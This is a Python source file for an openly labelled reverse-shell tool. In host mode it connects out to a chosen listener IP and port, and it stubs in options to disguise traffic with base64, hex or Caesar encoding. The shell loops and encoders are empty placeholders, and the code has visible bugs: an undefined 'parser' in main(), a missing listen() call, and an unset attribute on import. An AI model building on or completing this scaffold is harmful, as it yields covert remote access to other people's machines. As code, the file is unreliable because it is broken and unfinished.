import argparse
import socket


class reverse_shell:
    """Creates reverse shell
    """

    def __init__(self):
        """Runs main loop of reverse_shell
        """
        if __name__ == '__main__':
            self.parser = self.parse_args()
        else:
            self.setup()
        self.main()

    def setup(self):
        pass

    def verbose(self, *args):
        if self.parser.verbose:
            print(*args)

    def parse_args(self):
        """Parses command line arguments into usable parameters

        Returns:
            argparse.Namespace: parsed command line arguments
        """
        parser = argparse.ArgumentParser()
        parser.add_argument(
            'lhost', type=str, help='IP that the reverse shell will reach back out to')
        parser.add_argument('lport', type=int,
                            help='port that listener is listening on')
        parser.add_argument('-v', '--verbose', action='store_true')
        parser.add_argument('-u', '--udp', action='store_true',
                            help='sets communication protocol to udp')
        parser.add_argument(
            '-l', '--listener', help='Determines what side of the host/listener relationship current programming is running')
        encoding = parser.add_argument_group()
        encoding.add_argument(
            '--base64', help='encodes connection in base64', action='store_true')
        encoding.add_argument(
            '--caesar', help='encodes connection with caesar sipher', type=int)
        encoding.add_argument(
            '--hex', help='encodes connection in hex', action='store_true')
        # Encryption to add: AES, Blowfish, DES, Triple DES, RC2
        return parser.parse_args()

    def encoding(self, message):
        if self.parser.caesar:
            pass
        if self.parser.base64:
            pass
        if self.parser.hex:
            pass
        return message

    def decoding(self, message):
        if self.parser.hex:
            pass
        if self.parser.base64:
            pass
        if self.parser.caesar:
            pass
        return message

    def host(self):
        """Runs main loop for host, beacons back to listener
        """
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.verbose('[+] Created socket')
        self.socket.connect((self.parser.lhost, self.parser.lport))
        self.verbose(
            f'[+] Socket connected to {self.parser.lhost}:{self.parser.lport}')
        self.host_loop()

    def listener(self):
        """Runs main loop for listener, listens for beacons from host
        """
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.verbose('[+] Created server socket')
        self.socket.bind(('', self.parser.lport))
        self.verbose('[+] Server socket bound to port', self.parser.lport)
        c, addr = self.socket.accept()
        self.verbose('[+] Accepted incoming connection from', addr)
        self.listener_loop()

    def listener_loop(self):
        pass

    def host_loop(self):
        pass

    def main(self):
        """Runs main loop for reverse_shell
        """
        if parser.listener:
            self.listener()
        else:
            self.host()


if __name__ == '__main__':
    reverse_shell()
